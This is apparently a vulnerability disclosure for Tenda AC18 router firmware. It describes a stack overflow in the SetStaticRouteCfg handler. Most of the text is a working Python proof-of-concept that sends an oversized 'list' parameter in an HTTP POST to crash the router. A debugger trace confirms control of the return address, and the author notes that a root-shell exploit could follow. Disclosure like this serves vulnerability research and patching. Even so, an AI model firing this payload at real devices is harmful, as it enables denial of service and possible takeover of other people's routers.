# SetStaticRouteCfg

### Affected product

```
AC18 V15.03.05.19
```

/goform/SetStaticRouteCfg，list  is controllable and will eventually be spliced into para_2 by sscanf. It is worth noting that the size is not checked, resulting in a stack overflow vulnerability

### POC

```
import socket
import os

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

ip = '192.168.0.119'
port = 80

r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

r.connect((ip, port))

rn = b'\r\n'

p1 = b'a' * 0x1000
p2 = b'list' + p1

p3 = b"POST /goform/SetStaticRouteCfg" + b" HTTP/1.1" + rn
p3 += b"Host: 192.168.0.119" + rn
p3 += b"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0" + rn
p3 += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
p3 += b"Accept-Language: en-US,en;q=0.5" + rn
p3 += b"Accept-Encoding: gzip, deflate" + rn
p3 += b"Cookie: curShow=; ac_login_info=passwork; test=A; password=1111" + rn
p3 += b"Connection: close" + rn
p3 += b"Upgrade-Insecure-Requests: 1" + rn
p3 += (b"Content-Length: %d" % len(p2)) +rn
p3 += b'Content-Type: application/x-www-form-urlencoded'+rn
p3 += rn
p3 += p2

r.send(p3)

response = r.recv(4096)
response = response.decode()
li(response)
```

### Detail

```c
  v5 = sub_2BA8C(a1, "list", &unk_E5D48);
  v1 = sub_78390("adv.staticroute", v5, 126);
```

You can see the router crash, and finally we can write an exp to get a root shell

```
 ► 0xf65d6ed0 <sscanf+20>    bl     #__GI_vsscanf@plt <0xf65aff80>
                   r0: 0xf657d010 ◂— 0x61616161 ('aaaa')
                                                                                              		        r1: 0xe5cfc ◂— '%[^,],%[^,],%[^,],%s'
                   r2: 0xf6fff068 —▸ 0xf6fff0c4 ◂— 'kraaksaaktaakuaa'
                   r3: 0xf6fff0b4 ◂— 'knaakoaakpaakqaakraaksaaktaakuaa'


Invalid address 0x64616170

```

